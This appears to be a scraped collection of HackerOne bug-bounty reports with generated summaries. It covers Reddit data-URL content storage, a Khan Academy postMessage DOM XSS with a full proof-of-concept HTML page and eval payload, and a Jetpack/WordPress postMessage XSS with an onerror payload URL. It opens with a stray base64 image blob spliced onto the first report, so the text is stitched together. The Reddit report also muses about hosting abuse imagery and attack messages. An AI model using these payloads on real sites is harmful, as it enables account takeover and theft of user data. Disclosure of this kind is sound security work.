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
Also Criminals can get the data to persist and store it on reddit.com as valid links in href of a elements.
<a href='insert_above_url_in_here' > Now it persists</a>
This method will not be detected by current automation systems ,Criminals can further avoid human simply by posting normal valid comments and a links eg on monday normal and than on Friday lets say 12 pm for 2 hours at a scheduled window they can edit the same comment and update it to Child porn or illegal images so there clients can down load it for trading purposes. etc.
PROOF OF Terrorist & Illegal bombing messages being distributed
Once again criminals can have the data stored on reddit.com and persist through using <a href='insert_below_url_in_here' > Now it persists</a> a
So this demonstrates Illegal message and persistence.
when the user is on the url he will see message and instructions on how to join and view the message which is just right click and go.
Code 473 Bytes
1<code>
2https://s.reddit.com/WELCOME_TO_MY_CRIME_NETWORK_RIGHT_CLICK_AND_NAVIGATE_TO_THIS=data:text/html,<style>body{background-color:red;color:white}h1{font-size:50pt;margin-top:400PX;margin-left:100px;}p{font-size:25pt;margin-left:100px;}</style><h1>Top Secret ILLEGAL Criminal MESSAGE DISTRIBUTION</h1><p> This message will not be detected by AI systems,Your Mission  is  to Blow up something on the 12 of December 2022  4 pm a  water melon   at location MEXICO CITY</h1>
Once again the same avoid human detection with scheduled edits and can actually mobilize new reddit users to join in.
PROOF OF Storing and Distributing Javascript
This demonstrates storing, distribution of potentially dangerous JavaScript code using reddit.com
The code can persist as part of a comment using <a href='insert_below_url_in_here' > Now it persists</a>
Code 209 Bytes
1<code>
2https://s.reddit.com/WELCOME.TO.REDDITS.EXPERIMENTAL.FEATURE.RIGHT.CLICK.AND.GO.TO:data:text/html,%3Cscript%3Ealert('You%20could%20have%20been%20hacked%20with%20more%20advances%20js%20')%3C/script%3E%22
PROOF OF Storing and Distributing JSON data using reddit.
This demonstrates storing, distribution json data eg criminals exchanging data such as illegal links or data.
The json can persist as part of a comment using <a href='insert_below_url_in_here' > Now it persists</a>
Code 6.88 KiB
1<code>
2https://s.reddit.com/ILLEGAL_JSON_DISTRIBUTION_DOWNLOAD_HERE=data:text/json;charset=utf-8,[%20%7B%20%22id%22:%201,%20%22name%22:%20%22Leanne%20Graham%22,%20%22username%22:%20%22Bret%22,%20%22email%22:%20%22Sincere@april.biz%22,%20%22address%22:%20%7B%20%22street%22:%20%22Kulas%20Light%22,%20%22suite%22:%20%22Apt.%20556%22,%20%22city%22:%20%22Gwenborough%22,%20%22zipcode%22:%20%2292998-3874%22,%20%22geo%22:%20%7B%20%22lat%22:%20%22-37.3159%22,%20%22lng%22:%20%2281.1496%22%20%7D%20%7D,%20%22phone%22:%20%221-770-736-8031%20x56442%22,%20%22website%22:%20%22hildegard.org%22,%20%22company%22:%20%7B%20%22name%22:%20%22Romaguera-Crona%22,%20%22catchPhrase%22:%20%22Multi-layered%20client-server%20neural-net%22,%20%22bs%22:%20%22harness%20real-time%20e-markets%22%20%7D%20%7D,%20%7B%20%22id%22:%202,%20%22name%22:%20%22Ervin%20Howell%22,%20%22username%22:%20%22Antonette%22,%20%22email%22:%20%22Shanna@melissa.tv%22,%20%22address%22:%20%7B%20%22street%22:%20%22Victor%20Plains%22,%20%22suite%22:%20%22Suite%20879%22,%20%22city%22:%20%22Wisokyburgh%22,%20%22zipcode%22:%20%2290566-7771%22,%20%22geo%22:%20%7B%20%22lat%22:%20%22-43.9509%22,%20%22lng%22:%20%22-34.4618%22%20%7D%20%7D,%20%22phone%22:%20%22010-692-6593%20x09125%22,%20%22website%22:%20%22anastasia.net%22,%20%22company%22:%20%7B%20%22name%22:%20%22Deckow-Crist%22,%20%22catchPhrase%22:%20%22Proactive%20didactic%20contingency%22,%20%22bs%22:%20%22synergize%20scalable%20supply-chains%22%20%7D%20%7D,%20%7B%20%22id%22:%203,%20%22name%22:%20%22Clementine%20Bauch%22,%20%22username%22:%20%22Samantha%22,%20%22email%22:%20%22Nathan@yesenia.net%22,%20%22address%22:%20%7B%20%22street%22:%20%22Douglas%20Extension%22,%20%22suite%22:%20%22Suite%20847%22,%20%22city%22:%20%22McKenziehaven%22,%20%22zipcode%22:%20%2259590-4157%22,%20%22geo%22:%20%7B%20%22lat%22:%20%22-68.6102%22,%20%22lng%22:%20%22-47.0653%22%20%7D%20%7D,%20%22phone%22:%20%221-463-123-4447%22,%20%22website%22:%20%22ramiro.info%22,%20%22company%22:%20%7B%20%22name%22:%20%22Romaguera-Jacobson%22,%20%22catchPhrase%22:%20%22Face%20to%20face%20bifurcated%20interface%22,%20%22bs%22:%20%22e-enable%20strategic%20applications%22%20%7D%20%7D,%20%7B%20%22id%22:%204,%20%22name%22:%20%22Patricia%20Lebsack%22,%20%22username%22:%20%22Karianne%22,%20%22email%22:%20%22Julianne.OConner@kory.org%22,%20%22address%22:%20%7B%20%22street%22:%20%22Hoeger%20Mall%22,%20%22suite%22:%20%22Apt.%20692%22,%20%22city%22:%20%22South%20Elvis%22,%20%22zipcode%22:%20%2253919-4257%22,%20%22geo%22:%20%7B%20%22lat%22:%20%2229.4572%22,%20%22lng%22:%20%22-164.2990%22%20%7D%20%7D,%20%22phone%22:%20%22493-170-9623%20x156%22,%20%22website%22:%20%22kale.biz%22,%20%22company%22:%20%7B%20%22name%22:%20%22Robel-Corkery%22,%20%22catchPhrase%22:%20%22Multi-tiered%20zero%20tolerance%20productivity%22,%20%22bs%22:%20%22transition%20cutting-edge%20web%20services%22%20%7D%20%7D,%20%7B%20%22id%22:%205,%20%22name%22:%20%22Chelsey%20Dietrich%22,%20%22username%22:%20%22Kamren%22,%20%22email%22:%20%22Lucio_Hettinger@annie.ca%22,%20%22address%22:%20%7B%20%22street%22:%20%22Skiles%20Walks%22,%20%22suite%22:%20%22Suite%20351%22,%20%22city%22:%20%22Roscoeview%22,%20%22zipcode%22:%20%2233263%22,%20%22geo%22:%20%7B%20%22lat%22:%20%22-31.8129%22,%20%22lng%22:%20%2262.5342%22%20%7D%20%7D,%20%22phone%22:%20%22(254)954-1289%22,%20%22website%22:%20%22demarco.info%22,%20%22company%22:%20%7B%20%22name%22:%20%22Keebler%20LLC%22,%20%22catchPhrase%22:%20%22User-centric%20fault-tolerant%20solution%22,%20%22bs%22:%20%22revolutionize%20end-to-end%20systems%22%20%7D%20%7D,%20%7B%20%22id%22:%206,%20%22name%22:%20%22Mrs.%20Dennis%20Schulist%22,%20%22username%22:%20%22Leopoldo_Corkery%22,%20%22email%22:%20%22Karley_Dach@jasper.info%22,%20%22address%22:%20%7B%20%22street%22:%20%22Norberto%20Crossing%22,%20%22suite%22:%20%22Apt.%20950%22,%20%22city%22:%20%22South%20Christy%22,%20%22zipcode%22:%20%2223505-1337%22,%20%22geo%22:%20%7B%20%22lat%22:%20%22-71.4197%22,%20%22lng%22:%20%2271.7478%22%20%7D%20%7D,%20%22phone%22:%20%221-477-935-8478%20x6430%22,%20%22website%22:%20%22ola.org%22,%20%22company%22:%20%7B%20%22name%22:%20%22Considine-Lockman%22,%20%22catchPhrase%22:%20%22Synchronised%20bottom-line%20interface%22,%20%22bs%22:%20%22e-enable%20innovative%20applications%22%20%7D%20%7D,%20%7B%20%22id%22:%207,%20%22name%22:%20%22Kurtis%20Weissnat%22,%20%22username%22:%20%22Elwyn.Skiles%22,%20%22email%22:%20%22Telly.Hoeger@billy.biz%22,%20%22address%22:%20%7B%20%22street%22:%20%22Rex%20Trail%22,%20%22suite%22:%20%22Suite%20280%22,%20%22city%22:%20%22Howemouth%22,%20%22zipcode%22:%20%2258804-1099%22,%20%22geo%22:%20%7B%20%22lat%22:%20%2224.8918%22,%20%22lng%22:%20%2221.8984%22%20%7D%20%7D,%20%22phone%22:%20%22210.067.6132%22,%20%22website%22:%20%22elvis.io%22,%20%22company%22:%20%7B%20%22name%22:%20%22Johns%20Group%22,%20%22catchPhrase%22:%20%22Configurable%20multimedia%20task-force%22,%20%22bs%22:%20%22generate%20enterprise%20e-tailers%22%20%7D%20%7D,%20%7B%20%22id%22:%208,%20%22name%22:%20%22Nicholas%20Runolfsdottir%20V%22,%20%22username%22:%20%22Maxime_Nienow%22,%20%22email%22:%20%22Sherwood@rosamond.me%22,%20%22address%22:%20%7B%20%22street%22:%20%22Ellsworth%20Summit%22,%20%22suite%22:%20%22Suite%20729%22,%20%22city%22:%20%22Aliyaview%22,%20%22zipcode%22:%20%2245169%22,%20%22geo%22:%20%7B%20%22lat%22:%20%22-14.3990%22,%20%22lng%22:%20%22-120.7677%22%20%7D%20%7D,%20%22phone%22:%20%22586.493.6943%20x140%22,%20%22website%22:%20%22jacynthe.com%22,%20%22company%22:%20%7B%20%22name%22:%20%22Abernathy%20Group%22,%20%22catchPhrase%22:%20%22Implemented%20secondary%20concept%22,%20%22bs%22:%20%22e-enable%20extensible%20e-tailers%22%20%7D%20%7D,%20%7B%20%22id%22:%209,%20%22name%22:%20%22Glenna%20Reichert%22,%20%22username%22:%20%22Delphine%22,%20%22email%22:%20%22Chaim_McDermott@dana.io%22,%20%22address%22:%20%7B%20%22street%22:%20%22Dayna%20Park%22,%20%22suite%22:%20%22Suite%20449%22,%20%22city%22:%20%22Bartholomebury%22,%20%22zipcode%22:%20%2276495-3109%22,%20%22geo%22:%20%7B%20%22lat%22:%20%2224.6463%22,%20%22lng%22:%20%22-168.8889%22%20%7D%20%7D,%20%22phone%22:%20%22(775)976-6794%20x41206%22,%20%22website%22:%20%22conrad.com%22,%20%22company%22:%20%7B%20%22name%22:%20%22Yost%20and%20Sons%22,%20%22catchPhrase%22:%20%22Switchable%20contextually-based%20project%22,%20%22bs%22:%20%22aggregate%20real-time%20technologies%22%20%7D%20%7D,%20%7B%20%22id%22:%2010,%20%22name%22:%20%22Clementina%20DuBuque%22,%20%22username%22:%20%22Moriah.Stanton%22,%20%22email%22:%20%22Rey.Padberg@karina.biz%22,%20%22address%22:%20%7B%20%22street%22:%20%22Kattie%20Turnpike%22,%20%22suite%22:%20%22Suite%20198%22,%20%22city%22:%20%22Lebsackbury%22,%20%22zipcode%22:%20%2231428-2261%22,%20%22geo%22:%20%7B%20%22lat%22:%20%22-38.2386%22,%20%22lng%22:%20%2257.2232%22%20%7D%20%7D,%20%22phone%22:%20%22024-648-3804%22,%20%22website%22:%20%22ambrose.net%22,%20%22company%22:%20%7B%20%22name%22:%20%22Hoeger%20LLC%22,%20%22catchPhrase%22:%20%22Centralized%20empowering%20task-force%22,%20%22bs%22:%20%22target%20end-to-end%20models%22%20%7D%20%7D%20]
The same applies to xml data infact hackers could host and persist almost any type of data they want .
As the api system does not handle validation , error checking and content length accept for the arbitrary get limit implemented by ngix.
Conclusion
I have tested over 50 times on the api endpoints above and have not been flagged once or rate limited .
An attacker an store and persist any type of data or code they want and evade automated detections because the detection system will not check or validate the api endpoints for unwanted content , further more the attacker can steal users data and infect them with viruses, trackers ,spyware with more complex stored java scripts , if curious users click the link land on the api page and follow the simple instructions out of curiosity .
According to my studies at Cisa.gov this would be classified as very dangerous ability for an attacker , criminal network and other government funded hackers to have .
I hope this report has been extremely helpful .
Thanks
Impact
Main impact I would say is ability to store , distribute Javascript code , viruses ,malware and Illegal pictures.
Span of impact steal reddit users data and infect reddit users who out of curiosity follow the simple and easy to execute instructions once they view the page out of curiosity little do they know they would get infected or seen unwanted illegal material.
Many possible impacts :
Criminals could store &persists JavaScript code
Users who click the <a> href links in Redditt comments would land on the api page and out of curiosity think its valid messages from Reddit and actually execute the JavaScript code , json or terrorist influencing mobilization messages.
Criminals could trade child porn ,beheading and other illegal images on reddit without detection .
Criminals & Terrorist groups could distribute illegal bombing & attack messages
Criminals could store JavaScript code
User will not be presented with Warning that you are navigating away from Reddit.com
Criminals could pretend to be Legitimate Reddit employees and trick reddit users into navigating to & executing the code simply by right click Go to in there browser as a result Criminals could exploit reddit users & steal there cookies and infect them with viruses etc once they execute the stored code .
All of the above would by pass Reedits automated systems .



================================================================================
Vulnerability Description:
The vulnerability allows attackers to inject and persist malicious content, including illegal images, JavaScript code, and other data, through Reddit's API responses. This content can be distributed and stored on Reddit without detection by automated systems, enabling criminal activities such as trading illegal images, distributing malware, and spreading terrorist messages.

Steps to Reproduce:
1. Login to Reddit as a user and navigate to a specific URL that contains malicious content embedded in the API response.
2. Use the provided URL to store and distribute illegal content, JavaScript, or other malicious data by embedding it in HTML or JSON format within Reddit comments or posts.
Exploitation Difficulty:
The attack involves multiple components, including API manipulation, HTML/JSON injection, and social engineering to trick users into executing malicious content. The interaction between these components is non-obvious, requiring the attacker to understand how Reddit's API handles data and how users might interact with the malicious content.

--------------------------------------------------------------------------------



Cross-site Scripting (XSS) - DOM Vulnerabilities (5 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1758132: xss due to incorrect handling of postmessages
================================================================================
RAW DESCRIPTION:

Due to Insecure handling of create link tags (a tags) in a function called autolink found in 7Bmt.af733e428f9f986dfc96.js
Code 661 Bytes
1e = n.autolink(e, !0));
2        const n = function() {
3            const e = /\b(?:(?:https?:\/\/|www\d{0,3}[.]|[a-z0-9.\-]+[.][a-z]{2,4}\/)(?:[^\s()<>&]+|&amp;|\((?:[^\s()<>]|(?:\([^\s()<>]+\)))*\))+(?:\((?:[^\s()<>]|(?:\([^\s()<>]+\)))*\)|[^\s`!()\[\]{};:'".,<>?«»“”‘’&]))/gi;
4            return {
5                autolink: function(t, r) {
6                    return t.replace(e, (function(e) {
7                        /^https?:\/\//.test(e) || (e = "http://" + e);
8                        return "<a " + (r ? 'rel="nofollow"' : "") + ' href="' + e + '">' + e + "</a>"
9                    }
10                    ))
11                }
12            }
13        }();
which is ran in the challenges (ex: https://www.khanacademy.org/computing/computer-programming/programming/resizing-with-variables/pc/challenge-brown-bear-eyes). A specially crafted postmessage can abuse this.
Code 983 Bytes
1<!DOCTYPE html>
2<html>
3    <head>
4        <meta charset="utf-8">
5        <title>New webpage</title>
6    </head>
7    <body>
8        <script>
9        function main()
10{
11	window['test']=window.open("https://www.khanacademy.org/computing/computer-programming/programming/interactive-programs/pc/challenge-mouse-movement-mania");
12	const pwntimer = setTimeout(pwn, 3000);	
13}
14function pwn(){window['test'].postMessage('{"results":{"timestamp":'+Date.now()+',"code":"","errors":[],"assertions":[],"warnings":[],"tests":[{"name":"","state":"pass","results":[{"type":"assertion","msg":"http://#/\\"style=\\"width:2000px;height:2000px;position:fixed;top:0;left:0;margin-bottom:2000;z-index:200;\\"onmouseover=\\"eval(String.fromCharCode(97,108,101,114,116,40,34,112,119,110,100,33,34,41))\\"","state":"pass","expected":"","meta":{"structure":"function() {pwned!}"}}]}]}}',"*");clearTimeout(pwntimer)};
15        </script>
16        <button onclick="main();">press to pwn</button>
17    </body>
18</html>
also due to insecure host checking in the message event, the mentioned html code above can be run from any webpage.
The payload which the function autolink is insecurely creating the tag can look like this
http://#/"style="width:2000px;height:2000px;position:fixed;top:0;left:0;margin-bottom:2000;z-index:200;"onmouseover="eval(String.fromCharCode(97,108,101,114,116,40,34,112,119,110,100,33,34,41))" the malicious link will be set incorrectly and create extra attributes (in this case style and onmouseover)
the parsed json payload:
Code 779 Bytes
1{
2   "results":{
3      "timestamp":"",
4      "code":"",
5      "errors":[
6         
7      ],
8      "assertions":[
9         
10      ],
11      "warnings":[
12         
13      ],
14      "tests":[
15         {
16            "name":"",
17            "state":"pass",
18            "results":[
19               {
20                  "type":"assertion",
21                  "msg":"http://#/\"style=\"width:2000px;height:2000px;position:fixed;top:0;left:0;margin-bottom:2000;z-index:200;\"onmouseover=\"eval(String.fromCharCode(97,108,101,114,116,40,34,112,119,110,100,33,34,41))\"",
22                  "state":"pass",
23                  "expected":"",
24                  "meta":{
25                     "structure":"function() {pwned!}"
26                  }
27               }
28            ]
29         }
30      ]
31   }
32}
Impact
This attack could be steal user data (cookies, profile, etc) which in turn can be used to manipulate the user account, if it is a teacher who gets targeted, it can cause havoc with the email ("106 assignments have been assigned") as well as leak student private info. This attack could also be used to create a phishing page with the domain khanacademy.org by modifying the page to display a login box (stealing the users email and password).



================================================================================
Vulnerability Description:
The vulnerability is a DOM-based XSS caused by insecure handling of postMessages and improper URL sanitization in the autolink function. The function creates anchor tags from URLs without properly escaping or validating the input, allowing injection of arbitrary HTML attributes including JavaScript event handlers.

Steps to Reproduce:
1. Create an HTML file with a script that opens a Khan Academy challenge page in a new window and sends a specially crafted postMessage payload after a delay.
2. The payload includes a malicious URL that exploits the autolink function to inject arbitrary HTML attributes into an anchor tag, including event handlers like onmouseover.
Exploitation Difficulty:
This vulnerability requires understanding of multiple components: the postMessage API, the autolink function's behavior, and how to craft a payload that bypasses URL parsing while still executing JavaScript. The interaction between postMessage handling and DOM manipulation is non-obvious, and the attack requires precise timing and payload construction.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/2371019: DOM XSS on multiple Automattic domains through postMessages
================================================================================
RAW DESCRIPTION:

Hi Automattic team,
I have found a 2 flaws that when combined lead to DOM XSS on every website that is using Jetpack with the Likes feature enabled.
The 2 flaws are respectively:
A DOM XSS vulnerability on https://widgets.wp.com/sharing-buttons-preview/
The Jetpack plugin creates a postMessage listener allowing messages from the "widgets.wp.com" origin, but will not validate nor encode the avatar_url parameter before applying it to the DOM causing XSS.
Reproduction:
Navigate to https://0-a.nl/jetpackxssclick.html?url=https://wordpress.com/blog/2024/01/31/http3/ and click the PoC link.
Result
In the newly opened window a alert(document.domain) will pop on https://wordpress.com
<image_0>
Root causes
XSS on widgets.wp.com
The DOM XSS here is caused by the following included script:
https://widgets.wp.com/sharing-buttons-preview/js/preview.js
Code 474 Bytes
1        if (_.isArray(r.custom)) {
2            i = _.template(e("#tmpl-custom-button").html());
3            s = _.map(r.custom, function(e) {
4                var t = g.parseUrl(e.icon);
5                return new d({
6                    ID: e.name,
7                    markup: i({
8                        icon: o + "/" + t.host + t.pathname,
9                        name: e.name
10                    })
11                })
12            });
13            n = n.concat(s)
14        }
It's not that obvious because of the minified javascript but what happens is that 2 url parameters are parsed and used to add a UI element to the DOM:
?custom[0][icon]=iconurl&custom[0][name]=name
We can abuse the name parameter to create an XSS.
https://widgets.wp.com/sharing-buttons-preview/?custom[0][icon]=iconurl&custom[0][name]=%22%3E%3Cimg%20src%20onerror=alert()%3E
<image_1>
Insecure postMessage listener / codeblock
When we navigate to a website that has the Jetpack Likes feature enabled, a postMessage listener will be launched that will execute the JetpackLikesMessageListener function when a message arrives.
We can see it contains an origin check to only allow messages from widgets.wp.com. We can bypass this now since we have XSS on that domain:
Code 101 Bytes
1const allowedOrigin = 'https://widgets.wp.com';
2	if ( allowedOrigin !== event.origin ) {
3		return;
4	}
When we follow the code to the showOtherGravatars case, you'll see it use a liker.avatar_URL parameter (that is received via a postMessage) directly with innerHTML. This will allow us to send a tampered postMessage causing the XSS to be triggered.
Code 252 Bytes
1element.innerHTML = `
2				<a href="${ encodeURI( liker.profile_URL ) }" rel="nofollow" target="_parent" class="wpl-liker">
3					<img src="${ liker.avatar_URL }"
4						alt=""
5						style="width: 28px; height: 28px;" />
6					<span></span>
7				</a>
8				`;
Mitigation
Applying input validation and output encoding on the sharing-button page to mitigate the XSS https://widgets.wp.com/sharing-buttons-preview/
Defence in depth: now any XSS on widgets.wp.com will lead to multiple XSSes all over the internet (anyone using the Jetpack Likes features). To mitigate this, I would also apply encodeURI to the avatar_url before using it in innerHTML. Upon further research it seemed older version of the plugin did exactly this, but in later versions this was removed.
Impact
XSS on a number of Automattic domains:
https://0-a.nl/jetpackxssclick.html?url=https://wordpress.com/blog/2024/01/31/http3
https://0-a.nl/jetpackxssclick.html?url=https://jetpack.com/blog/wordpress-navigation-menu/
You probably have better insights in this (also I'd love to hear the actual number :) ) but searching publicwww.com revealed over 100k websites using this feature, meaning 100k domains vulnerable to this XSS.
This is also the reason I picked High for severity. If it was just wordpress.com I would probably have gone for Medium which is more typical for these kind of XSSes without providing more impact specific to the vulnerable domain. But in this case the vulnerability reaches far beyond the 1 domain.
In general, if an attacker can control a script that is executed in the victim's browser, then they can typically fully compromise that user. Amongst other things, the attacker can:
Perform any action within the application that the user can perform.
View any information that the user is able to view.
Modify any information that the user is able to modify.



================================================================================
Vulnerability Description:
This is a DOM XSS vulnerability affecting multiple Automattic domains through insecure postMessage handling in Jetpack's Likes feature. The attack combines an XSS in widgets.wp.com with insecure postMessage handling in Jetpack, allowing attackers to execute arbitrary JavaScript in the context of any Jetpack-enabled site.

Steps to Reproduce:
1. Navigate to https://widgets.wp.com/sharing-buttons-preview/?custom[0][icon]=iconurl&custom[0][name]=%22%3E%3Cimg%20src%20onerror=alert()%3E to trigger XSS on widgets.wp.com
